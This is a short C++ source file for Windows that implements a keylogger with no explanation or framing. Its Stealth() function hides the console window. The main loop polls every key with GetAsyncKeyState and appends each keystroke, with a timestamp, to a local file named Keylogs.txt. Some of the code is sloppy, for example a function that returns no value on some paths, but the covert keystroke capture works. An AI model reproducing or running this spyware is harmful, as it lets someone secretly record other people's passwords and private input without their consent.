#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <winuser.h>
#include <time.h>
#include <stdio.h>
#include <iostream>
#include <string>

using std::fstream;
using std::ofstream;

using namespace std;

void WriteData(std::string Text) {
    ofstream LogFile;
    LogFile.open("Keylogs.txt", fstream::app);

    time_t my_time = time(NULL);

    #pragma warning(suppress : 4996)
    LogFile << Text << ("%s", ctime(&my_time));
    LogFile.close();
}

void Stealth() {
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}

bool isKeyListed(int vKey) {
    switch (vKey) {
    case VK_BACK:
        WriteData("Back key    ");
        break;
    case VK_SPACE:
        WriteData("Space key   ");
        break;
    case VK_SHIFT:
        WriteData("Shift key   ");
        break;
    case VK_OEM_PERIOD:
        WriteData(".           ");
        break;
    case VK_LBUTTON:
        WriteData("LMB         ");
        break;
    case VK_RBUTTON:
        WriteData("RMB         ");
        break;
    case VK_MBUTTON:
        WriteData("MMB         ");
        break;
    case VK_RETURN:
        WriteData("Enter       ");
        break;
    case VK_TAB:
        WriteData("Tab         ");
        break;
    case VK_UP:
        WriteData("Up key      ");
        break;
    case VK_DOWN:
        WriteData("Down key    ");
        break;
    case VK_LEFT:
        WriteData("Left key    ");
        break;
    case VK_RIGHT:
        WriteData("Right key   ");
        break;
    case VK_NUMLOCK:
        WriteData("Num lock    ");
        break;
    case VK_ADD:
        WriteData("Num pad +   ");
        break;
    case VK_SUBTRACT:
        WriteData("Num pad -   ");
        break;
    case VK_NUMPAD0:
        WriteData("Num pad 0   ");
        break;
    case VK_NUMPAD1:
        WriteData("Num pad 1   ");
        break;
    case VK_NUMPAD2:
        WriteData("Num pad 2   ");
        break;
    case VK_NUMPAD3:
        WriteData("Num pad 3   ");
        break;
    case VK_NUMPAD4:
        WriteData("Num pad 4   ");
        break;
    case VK_NUMPAD5:
        WriteData("Num pad 5   ");
        break;
    case VK_NUMPAD6:
        WriteData("Num pad 6   ");
        break;
    case VK_NUMPAD7:
        WriteData("Num pad 7   ");
        break;
    case VK_NUMPAD8:
        WriteData("Num pad 8   ");
        break;
    case VK_NUMPAD9:
        WriteData("Num pad 9   ");
        break;

    default: return false;
    }
}

int main() {

    Stealth();
    char Key;
    while (1) {
        for (Key = 8; Key <= 255; Key++) {
            if (GetAsyncKeyState(Key) == -32767) {
                if (isKeyListed(Key) == 0) {
                    ofstream LogFile;
                    LogFile.open("Keylogs.txt", fstream::app);

                    time_t my_time = time(NULL);

                    #pragma warning(suppress : 4996)
                    LogFile << Key << "           " << ("%s", ctime(&my_time));
                    LogFile.close();
                }
            }
        }
    }
}
